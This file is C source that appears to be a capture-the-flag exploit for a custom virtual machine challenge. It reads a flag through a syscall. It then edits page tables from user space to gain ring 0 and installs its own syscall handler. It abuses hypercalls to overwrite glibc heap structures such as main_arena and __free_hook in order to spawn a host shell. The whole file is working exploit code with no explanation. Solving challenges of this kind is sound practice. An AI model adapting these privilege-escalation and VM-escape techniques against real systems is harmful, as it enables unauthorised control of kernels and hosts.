#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils/hypercall.h"
#include "utils/syscall.h"

#define PDE64_PRESENT  1
#define PDE64_RW       (1U << 1)
#define PDE64_USER     (1U << 2)
#define PDE64_PS       (1U << 7)

void get_flag1(void);
void get_flag2(void);
void get_shell(void);
void switch_ring0(void);
void syscall_handler(void);

int main(void){
	get_flag1();
	switch_ring0();

	return 0;
}

void get_flag1(void){
	char *flag;

	puts("Try to call sys_getflag");

	syscall(flag, NR_getflag);
	if((long)flag < 0){
		puts("failed to get flag.");
		return;
	}

	mprotect(flag, 0x1000, PROT_READ);
	puts(flag);
	munmap(flag, 0x1000);
}

void switch_ring0(void){
	void *addr;
	uint64_t *pd, *pt;

	puts("Try to switch ring0");

	addr = mmap((void*)0x80000000, 0x3000, PROT_READ|PROT_WRITE, 0, -1, 0);
	munmap(addr, 0x1000);
	mmap((void*)0xc0000000, 0x1000, PROT_READ|PROT_WRITE, 0, -1, 0);

	pd = addr + 0x1000;
	pt = addr + 0x2000;

	for(int i = 0; i<2; i++) // pd[0]
		pt[i] = PDE64_PRESENT | PDE64_RW | PDE64_USER | (0x1000*i);
	for(int i = 0; i<3; i++)
		pd[8+i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (0x400000 + 0x200000*i);

	memcpy((void*)(0xc0000000 + OFST_SYS_HANDLER), &syscall_handler, 0x800);

	asm("syscall");
}

void syscall_handler(void){
	get_flag2();
	get_shell();

	asm("hlt");
}

void get_flag2(void){
	char *flag;

	flag = hc_load_module(2, 0, 0, 0x1000);
	hc_write(flag + 0x8040000000, 0x50, 0);
	hc_free(flag);
}

void get_shell(void){
	void *libc = (void*)0xc1000000;
	void *main_arena;
	uint64_t *free_hook;

	hc_read(&main_arena, 0x8, 0);
	hc_read(&free_hook, 0x8, 0);
	main_arena = libc + (uint64_t)main_arena;
	free_hook  = libc + (uint64_t)free_hook;

	uint64_t *pd = (uint64_t*)(0x8040000000 + 0x2e000); //

	hc_write(main_arena + 0x60, 0x18, 0);
	hc_read(free_hook, 0x8, 0);
	hc_read(&pd[16], 0x8, 0);

	char *heap = (void*)0xc2000000;
	uint64_t offset;
	hc_read(&offset, 0x8, 0);

	void *p[2];
	p[0] = hc_malloc(0, 0x1000);
	p[1] = hc_malloc(0, 0x1000);

	hc_free(p[0]);
	hc_read(heap+offset, 0x8, 0);
	hc_free(p[1]);
}
